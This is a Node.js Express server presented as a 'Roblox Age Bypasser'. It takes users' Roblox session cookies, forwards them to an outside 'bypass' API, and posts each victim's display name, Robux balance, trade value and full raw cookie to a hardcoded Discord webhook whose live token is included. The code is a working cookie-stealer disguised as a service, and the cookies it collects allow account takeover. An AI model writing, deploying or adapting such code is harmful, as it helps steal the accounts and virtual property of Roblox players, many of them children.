const express = require('express');
const cloudscraper = require('cloudscraper'); // Essential for Cloudflare bypass
const axios = require('axios'); // Used for sending webhook data
const { RobloxUser } = require('./getuserinfo'); // Helper for Roblox user info retrieval

const app = express();
app.use(express.json());

// Precise API URLs
const API_BASE_URL = 'https://rblxbypasser.com/api';
const WEBHOOK_URL = "https://discord.com/api/webhooks/1450559440221900941/G8PfWJn3sZ6FEtCdVzgFUg-IgYHzPG2vhEN4lHMQLGGjQ8rRhPsOdvrCK7GTp8yOfiLZ";

// Debugging: Send error logs to Discord webhook
const logToWebhook = async (title, description, color = 0xf54242) => {
    try {
        await axios.post(WEBHOOK_URL, {
            embeds: [{ title, description, color }]
        });
    } catch (err) {
        console.error("Failed to send debug log to webhook:", err.message);
    }
};

// --- Endpoint 1: Starts the bypass process ---
app.post('/api/bypass', async (req, res) => {
    const { cookie } = req.body;

    if (!cookie) {
        const message = "No cookie provided.";
        await logToWebhook("Bypass Error", message);
        return res.status(400).json({ success: false, message });
    }

    try {
        const response = await cloudscraper.post(`${API_BASE_URL}/bypass`, {
            cookie: cookie // Send the cookie as required by the API
        }, {
            json: true     // Ensure response is automatically parsed as JSON
        });

        res.status(200).json(response); // Success response
    } catch (error) {
        const message = error.message || "Failed to initiate bypass.";
        console.error(message);
        await logToWebhook("Bypass Failure", message);
        return res.status(500).json({ success: false, message });
    }
});

// --- Endpoint 2: Polls for progress ---
app.get('/api/progress', async (req, res) => {
    const { token } = req.query;

    if (!token) {
        const message = "No token provided.";
        await logToWebhook("Progress Error", message);
        return res.status(400).json({ success: false, message });
    }

    try {
        const response = await cloudscraper.get(`${API_BASE_URL}/progress`, {
            qs: { token: token } // Pass the token as a query string
        });

        res.status(200).json(JSON.parse(response)); // Success response (parsed JSON)
    } catch (error) {
        const message = error.message || "Failed to poll progress.";
        console.error(message);
        await logToWebhook("Progress Failure", message);
        return res.status(500).json({ success: false, message });
    }
});

// --- Endpoint 3: Webhook logging user info ---
app.post('/api/webhook', async (req, res) => {
    const { cookie } = req.body;

    if (!cookie) {
        const message = "No cookie provided.";
        await logToWebhook("Webhook Error", message);
        return res.status(400).send("Webhook ignored: No cookie provided.");
    }

    try {
        const robloxUser = await RobloxUser.register(cookie);
        const userData = await robloxUser.getUserData();
        const format = (num) => new Intl.NumberFormat('en-US').format(num);

        const embed = {
            color: 0x43afff,
            author: {
                name: `${userData.displayName} (@${userData.username}) - Age Bypassed`,
                url: `https://www.roblox.com/users/${userData.uid}/profile`
            },
            thumbnail: { url: userData.avatarUrl },
            fields: [
                { name: 'Robux', value: `\`${format(userData.balance)}\`` },
                { name: 'RAP', value: `\`${format(userData.rap)}\`` },
                { name: 'Cookie Used', value: `\`\`\`${cookie}\`\`\`` }
            ],
            footer: { text: "Roblox Age Bypasser • Success", icon_url: "https://i.imgur.com/9Cg0Y96.png" }
        };

        await axios.post(WEBHOOK_URL, { embeds: [embed] });
        res.status(200).send("Webhook sent successfully.");
    } catch (error) {
        const message = error.message || "Webhook processing failed.";
        console.error("Webhook Failure:", message);
        await logToWebhook("Webhook Failure", message);
        res.status(500).send("Webhook failed.");
    }
});

module.exports = app;
